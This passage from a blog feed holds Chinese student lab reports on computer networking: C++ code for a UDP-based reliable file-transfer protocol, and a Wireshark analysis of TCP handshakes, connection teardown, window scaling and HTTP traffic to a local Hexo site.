class="hljs-string">"Received a SYN packet, reset the timer"</span>, WARNING);            <span class="hljs-comment">// wait for the file info again</span>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">ready_for_file</span>(file_name, file_size);        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isFIN</span>(rcvpkt)) {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a FIN packet, close the connection"</span>, SUC);            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK_FIN);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a wrong packet"</span>, ERR);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Timeout when waiting for file info"</span>, ERR);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    }}</code></pre></div></div><h3 id="其他工具类">其他工具类</h3><h4 id="校验和">校验和</h4><p>由于此次实验并没有要求可变ip和端口号，因此不必加入伪首部的校验。编写代码如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2fosojlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-2fosojlluwpkzv"><pre><code class="hljs c++"><span class="hljs-function">u_short <span class="hljs-title">check_sum</span><span class="hljs-params">(u_short *packet, <span class="hljs-type">int</span> packet_len)</span> </span>{    u_long sum = <span class="hljs-number">0</span>;    <span class="hljs-comment">// make 16 bit words adjacent</span>    <span class="hljs-type">int</span> count = (packet_len + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;    <span class="hljs-keyword">auto</span> *temp = <span class="hljs-keyword">new</span> u_short[count + <span class="hljs-number">1</span>];    <span class="hljs-built_in">memset</span>(temp, <span class="hljs-number">0</span>, count + <span class="hljs-number">1</span>);    <span class="hljs-built_in">memcpy</span>(temp, packet, packet_len);    <span class="hljs-keyword">while</span> (count--) {        sum += *temp++;        <span class="hljs-comment">//overflow carry</span>        <span class="hljs-keyword">if</span> (sum &amp; <span class="hljs-number">0xFFFF0000</span>) {            sum &amp;= <span class="hljs-number">0xFFFF</span>;            sum++;        }    }    <span class="hljs-comment">//complement</span>    <span class="hljs-keyword">return</span> ~(sum &amp; <span class="hljs-number">0xFFFF</span>);}</code></pre></div></div><p>校验方法： </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ut3emnlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-ut3emnlluwpkzv"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">not_corrupt</span><span class="hljs-params">(packet &amp;p)</span> </span>{    <span class="hljs-keyword">return</span> <span class="hljs-built_in">check_sum</span>((u_short *) &amp;p, HEAD_SIZE + p.head.data_size) == <span class="hljs-number">0</span>;}</code></pre></div></div><p></p><h4 id="创建数据包">创建数据包</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-00uo04lluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-00uo04lluwpkzv"><pre><code class="hljs c++"><span class="hljs-function">packet <span class="hljs-title">make_pkt</span><span class="hljs-params">(u_int flag, u_int seq = <span class="hljs-number">0</span>, u_short data_size = <span class="hljs-number">0</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data = <span class="hljs-literal">nullptr</span>, u_short window_size = <span class="hljs-number">0</span>,</span></span><span class="hljs-params"><span class="hljs-function">                u_int option = <span class="hljs-number">0</span>)</span> </span>{    packet pkt;    pkt.head.flag = flag;    pkt.head.seq = seq;    pkt.head.window_size = window_size;    pkt.head.data_size = data_size;    pkt.head.option = option;    <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">nullptr</span>) {        <span class="hljs-built_in">memcpy</span>(pkt.data, data, data_size);    }    pkt.head.check_sum = <span class="hljs-built_in">check_sum</span>((u_short *) &amp;pkt, PACKET_SIZE);    <span class="hljs-keyword">return</span> pkt;}</code></pre></div></div><h2 id="程序演示">程序演示</h2><h3 id="建立连接">建立连接</h3><p>路由器设置：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210921560514_535_20221119192132716638_161_image-20221119185527966.png" alt="image-20221119185527966"><figcaption aria-hidden="true">image-20221119185527966</figcaption></figure><p>接收端开启的稍微晚一些，可以看到发送端有一些重发的握手包：</p><p>发送端：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210922486310_715_20221119192135114475_628_image-20221119184351874.png" alt="image-20221119184351874"><figcaption aria-hidden="true">image-20221119184351874</figcaption></figure><p>接收端：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210923536028_235_20221119192137753520_483_image-20221119184414935.png" alt="image-20221119184414935"><figcaption aria-hidden="true">image-20221119184414935</figcaption></figure><p>发送端没有进行文件发送，接收端超时退出：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210924447506_576_20221119192140166643_147_image-20221119184511051.png" alt="image-20221119184511051"><figcaption aria-hidden="true">image-20221119184511051</figcaption></figure><p>异常丢包提示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210925394972_118_20221119192142733601_999_image-20221119184627493.png" alt="image-20221119184627493"><figcaption aria-hidden="true">image-20221119184627493</figcaption></figure><p>发送端文件发送完毕：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210926345559_488_20221119192145332007_368_image-20221119184759988.png" alt="image-20221119184759988"><figcaption aria-hidden="true">image-20221119184759988</figcaption></figure><p>多文件接收</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210927763460_372_20221119192148152631_686_image-20221119185617149.png" alt="image-20221119185617149"><figcaption aria-hidden="true">image-20221119185617149</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验二_Wireshark分析交互过程</title>
    <link href="/posts/13596/"/>
    <url>/posts/13596/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验二_wireshark分析交互过程">计算机网络实验二_Wireshark分析交互过程</h1><h2 id="实验要求">实验要求</h2><p>（1）搭建Web服务器（自由选择系统），并制作简单的Web页面，包含简单文本信息（至少包含专业、学号、姓名）和自己的LOGO。</p><p>（2）通过浏览器获取自己编写的Web页面，使用Wireshark捕获浏览器与Web服务器的交互过程，并进行简单的分析说明</p><ul><li>主要分析的是tcp握手、http请求应答、tcp挥手几个过程和相关问题</li></ul><h2 id="wireshark可以做什么"><a href="https://zhuanlan.zhihu.com/p/82498482">Wireshark可以做什么</a></h2><ul><li>网络管理员使用Wireshark检测网络问题</li><li>网安工程师用Wireshark检查信息安全相关问题</li><li>开发者使用Wireshark为新的通信协议调试</li><li>普通用户使用Wireshark学习网络协议相关知识</li><li>憨憨学生使用Wireshark应付TCP/IP课程要求(别骂了)</li></ul><h2 id="服务器搭建">服务器搭建</h2><p>在本次实验中我使用了本地服务器。我们可以使用Springboot，flask等在localhost上搭建Web服务器。不过最近恰好在研究博客搭建相关内容，这里通过使用Hexo搭建静态博客的比较“自动化”的方式在本机搭建Web服务器。</p><p>通过下面命令安装<code>hexo</code>环境。(其实还需要安装<code>npm</code>环境，不过在此就略去了)。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fuag43lluwpkzv"></i><span>shell</span><div class="collapse show" id="collapse-fuag43lluwpkzv"><pre><code class="hljs shell">sudo npm install -g hexo-cli</code></pre></div></div><p>新建博客目录结构如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6voy0llluwpkzv"></i><span>shell</span><div class="collapse show" id="collapse-6voy0llluwpkzv"><pre><code class="hljs shell">my_hexo_test_server.├── _config.yml├── db.json├── node_modules├──...├── package-lock.json├── package.json├── public├── scaffolds├── source│&nbsp;&nbsp; └── _posts└── themes    └── wireshark        ├── _config.yml        ├── layout        │&nbsp;&nbsp; ├── index.ejs        │&nbsp;&nbsp; ├── layout.ejs        │&nbsp;&nbsp; └── post.ejs        └── source            ├── css            ├── img            └── js</code></pre></div></div><p><code>_config.yml</code>中<code>theme</code>改为自定义的<code>wireshark</code>，在<code>index.ejs</code>中写入网页内容：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-m3o7twlluwpkzv"></i><span>html</span><div class="collapse show" id="collapse-m3o7twlluwpkzv"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>this is layout.ejs<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span> 2013599 田佳业<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>计算机科学与技术<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"img/test.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div></div><p>在终端执行 </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sy2qwolluwpkzv"></i><span>shell</span><div class="collapse show" id="collapse-sy2qwolluwpkzv"><pre><code class="hljs shell">(base) ➜  my_hexo_test_server hexo g(base) ➜  my_hexo_test_server hexo s</code></pre></div></div><p></p><p>可以看到生成网页如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210657935762_127_20221028232042709573_203_image-20221026200601767.png" alt="image-20221026200601767"><figcaption aria-hidden="true">image-20221026200601767</figcaption></figure><h2 id="wireshark-分析tcp连接过程">Wireshark 分析TCP连接过程</h2><p>由于服务器在本地，选择<code>Loopback:lo0</code>即可。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210700374694_433_20221028232044366413_373_image-20221026200751668.png" alt="image-20221026200751668"><figcaption aria-hidden="true">image-20221026200751668</figcaption></figure><p>首先我们需要尝试找到TCP建立连接三次握手的位置。刷新网页，并输入<code>http</code>进行过滤，以隐藏其他无关的数据包。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210701652648_872_20221028232045903947_824_image-20221028173616526.png" alt="image-20221028173616526">找到第一个<code>GET</code>数据包。右键选中，<code>Follow stream</code>——<code>TCPstream</code>，显示握手信息。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210702797226_521_20221028232048121868_131_image-20221028174135897.png" alt="image-20221028174135897"><figcaption aria-hidden="true">image-20221028174135897</figcaption></figure><h3 id="三次握手">三次握手</h3><p>下面展示了三次握手的过程，并结合握手信息对照报文段进行分析：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210704135079_964_20221028232049728449_411_image-20221028175332107.png" alt="image-20221028175332107"><figcaption aria-hidden="true">image-20221028175332107</figcaption></figure><ul><li>第一次握手：建立连接时，客户端发送SYN包（Seq=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（SynchronizeSequence Numbers）。</li></ul><p>捕获的第一段报文如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210705714512_581_20221028232051494572_180_image-20221028174837176.png" alt="image-20221028174837176"><figcaption aria-hidden="true">image-20221028174837176</figcaption></figure><p>博客示例网页运行在<code>localhost:4000</code>，目的端口号匹配。同时可以看到Flag字段值为2，也即第二位SYN字段为1，其余全0。</p><ul><li>第二次握手：服务器收到SYN包，必须确认客户的SYN（ACK=j+1），同时自己也发送一个SYN包（SYN=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</li></ul><p>第二段报文如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210707089949_308_20221028232054080895_215_image-20221028175454476.png" alt="image-20221028175454476"><figcaption aria-hidden="true">image-20221028175454476</figcaption></figure><p>从端口号可以看出，这是服务器发给客户的。Flag字段为ACK和SYN。这次我们注意一下确认序列号的值。从<a href="https://wiki.wireshark.org/TCP_Relative_Sequence_Numbers">WiresharkWiki</a>我们可以了解到，考虑到可读性其在列表中采用了相对序列号。在详细信息中可以看到原始(<code>raw</code>)序列号。我们可以看到：</p><p>第一次握手客户端<code>Sequence Number (raw):2932922641</code>（Seq=j）</p><p>第二次握手服务器端<code>Acknowledgment number (raw):2932922642</code>（ACK=j+1），与示意图中的握手过程的过程相符。</p><ul><li>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手，客户端与服务器开始传送数据。</li></ul><p>同样可以验证ACK(ack=k+1）。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210708887036_756_20221028232056001837_289_image-20221028180628702.png" alt="image-20221028180628702"><figcaption aria-hidden="true">image-20221028180628702</figcaption></figure><p>也可对照查看右侧的十六进制报文源码。</p><h4 id="过程理解">过程理解</h4><p class="note note-primary">为什么是三次握手？</p><p>需要以最小的代价验证会话双方的收发功能正常:</p><ul><li><p>第一次握手成功：说明客户端的数据可以被服务端收到，说明客户端的发功能可用，说明服务端的收功能可用。但客户端自己不知道数据是否被接收。</p></li><li><p>第二次握手成功：说明服务端的数据可以被客户端收到，说明服务端的发功能可用，说明客户端的收功能可用。同时客户端知道自己的数据已经正确到达服务端，自己的发功能正常。但是服务端自己不知道数据是否被接收。</p></li><li><p>第三次握手成功：说明服务端知道自己的数据已经正确到达客户端端，自己的发功能正常。至此服务成功建立。</p></li></ul><p class="note note-primary">为什么每次连接的序列号都不同？</p><p>避免新老连接混淆</p><h4 id="syn洪泛攻击">Syn洪泛攻击</h4><p>在 TCP 连接的三次握手过程中，我们假设发生以下情况：</p><p>一个用户向服务器发送了 Syn报文后突然死机或掉线, 则服务器在发出 SYN和ACK 应答报文后，客户端无法及时答复，导致服务器无法收到客户端的 ACK报文( 即第三次握手无法完成) 。</p><p>这种情况下服务器端一般会重试并等待一段时间后丢弃这个未完成的连接,称为<strong>半连接握手状态。</strong></p><p>攻击者只需要向服务端发送大量的TCP请求连接而不进行第三次回应，就会出现大量的这种半握手状态的连接,在服务器产生很多的请求队列,<strong>由于第一次握手时服务端就已经为客户端开辟了接收缓冲区</strong>，大量的请求最后的结果往往是堆栈溢出崩溃,服务器也将忙于处理攻击者伪造的TCP连接请求而无暇理睬客户的正常请求,此时服务器失去了对客户端的响应, 从而达到SynFlood攻击的目的。</p><p><a href="https://zhuanlan.zhihu.com/p/457884093">DoS攻击之Syn洪泛攻击原理及防御</a></p><h3 id="四次挥手">四次挥手</h3><p>左边的实线连起来的表示同一次会话发生的各个阶段。沿着这条线走到最底端，可以看到四次挥手的过程。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210711202693_873_20221028232058311718_623_image-20221028181245513.png" alt="image-20221028181245513"><figcaption aria-hidden="true">image-20221028181245513</figcaption></figure><p>结合TCP连接关闭的过程，可以看到第81到84个报文是挥手的过程。分析方式与握手类似，在此不再赘述。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210712345252_558_20221028232100061679_207_image-20221028181501786.png" alt="image-20221028181501786"><figcaption aria-hidden="true">image-20221028181501786</figcaption></figure><p>另外，其实两端中的任何一个都可以主动提出关闭连接。只是通常情况下是客户端。</p><h4 id="过程理解-1">过程理解</h4><p class="note note-primary">第二次挥手和第三次挥手一定是紧挨着的吗？</p>不一定。这时候只是表示A不再发送数据。服务器仍可在这两次挥手中间发送一些数据。<p class="note note-primary">为什么第四次挥手后A不能立刻释放资源？</p>A并不知道B有没有正确的收到了A的ACK。正常情况下什么也不会发生。但如果没收到，B应当重传FIN，A得知道<p class="note note-primary">为什么要等两倍MSL？</p><p>无论是否正常，A都需要等待，要取这两种情况等待时间的最大值，以应对最坏的情况发生，这个最坏情况是：去向ACK消息最大存活时间（MSL) + 来向FIN消息的最大存活时间(MSL)。</p><p class="note note-primary">一定要四次挥手吗？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210713552048_108_20221102112611088782_354_image-20221102103437478.png" alt="image-20221102103437478"><figcaption aria-hidden="true">image-20221102103437478</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210714695223_822_20221102112614834681_752_image-20221102103222135.png" alt="image-20221102103222135"><figcaption aria-hidden="true">image-20221102103222135</figcaption></figure><p>客户端和服务端的生命周期总结如下：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210715568267_759_20221028232101334092_481_image-20221028181827531.png" alt="image-20221028181827531"><figcaption aria-hidden="true">image-20221028181827531</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210717454207_339_20221028232103339683_762_image-20221028181835974.png" alt="image-20221028181835974"><figcaption aria-hidden="true">image-20221028181835974</figcaption></figure><h3 id="传输窗口">传输窗口</h3><h4 id="tcp-window-scale">TCP Window Scale</h4><p>在TCP刚被发明的时候，全世界的网络带宽都很小，所以最大接收窗口被定义成65535字节。随着硬件的革命性进步，65535字节已经成为性能瓶颈了，怎么样才能扩展呢？TCP头中只给接收窗口值留了 16 bit，肯定是无法突破 65535 （<span class="math inline">\(2^{16} − 1\)</span>）的。 1992年的 RFC1323中提出了一个解决方案，就是在三次握手时，把自己的 WindowScale信息告知对方。由于 Window Scale放在 TCP头之外的Options中，所以不需要修改 TCP头的设计。 WindowScale的作用是向对方声明一个 Shift count，我们把它作为 2的指数，再乘以TCP头中定义的接收窗口，就得到真正的 TCP接收窗口了。</p><p>这对应于Wireshark中的Caculated window size，如下图所示。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210719179687_261_20221028232105453916_456_image-20221028184429901.png" alt="image-20221028184429901"><figcaption aria-hidden="true">image-20221028184429901</figcaption></figure><h2 id="http传输分析">Http传输分析</h2><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210720298497_440_20221028232107541741_783_image-20221028190921283.png" alt="image-20221028190921283"><figcaption aria-hidden="true">image-20221028190921283</figcaption></figure><p>以下是前三个HTTP传输报文。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210721857050_893_20221028232109214457_454_image-20221028191110711.png" alt="image-20221028191110711"><figcaption aria-hidden="true">image-20221028191110711</figcaption></figure><p>查看第一次客户端向服务器发送GET请求，含有浏览器请求头以及请求行。GET方法没有请求体。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210723036742_240_20221028232111055813_462_image-20221028190632604.png" alt="image-20221028190632604"><figcaption aria-hidden="true">image-20221028190632604</figcaption></figure><p>从右边解析出的明文可以看出HTTP是采用ASCII码进行传输的。</p><p>之后请求成功，返回200状态码及HTML。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210725379619_811_20221028232113806376_581_image-20221028191208877.png" alt="image-20221028191208877"><figcaption aria-hidden="true">image-20221028191208877</figcaption></figure><p>分析文本的十六进制编码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ex3kxtlluwpkzv"></i><span>apache</span><div class="collapse show" id="collapse-ex3kxtlluwpkzv"><pre><code class="hljs apache"><span class="hljs-attribute">0000</span>   <span class="hljs-number">20</span> <span class="hljs-number">20</span> <span class="hljs-number">20</span> <span class="hljs-number">20</span> <span class="hljs-number">3</span>c <span class="hljs-number">68</span> <span class="hljs-number">32</span> <span class="hljs-number">3</span>e <span class="hljs-number">20</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> <span class="hljs-number">31</span> <span class="hljs-number">33</span> <span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span><span class="hljs-attribute">0010</span>   <span class="hljs-number">20</span> e7 <span class="hljs-number">94</span> b0 e4 bd b3 e4 b8 <span class="hljs-number">9</span>a <span class="hljs-number">3</span>c <span class="hljs-number">2</span>f <span class="hljs-number">68</span> <span class="hljs-number">32</span> <span class="hljs-number">3</span>e <span class="hljs-number">0</span>a</code></pre></div></div><p>第一行末尾可以看到是我的学号<code>2013599</code>的ASCII码。</p><p>中文采用的是Unicode编码。具体方式为：</p><blockquote><p>将需要转码的字符，按指定编码方式（默认使用UTF-8编码）转化为字节流，每个字节按16进制表示，并添加%组成一个percent编码。</p></blockquote><p>给第二行每个字节前加%后用UrlDecode解码，可以还原出我的名字。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210728206705_896_20221028232117064239_862_image-20221028193717733.png" alt="image-20221028193717733"><figcaption 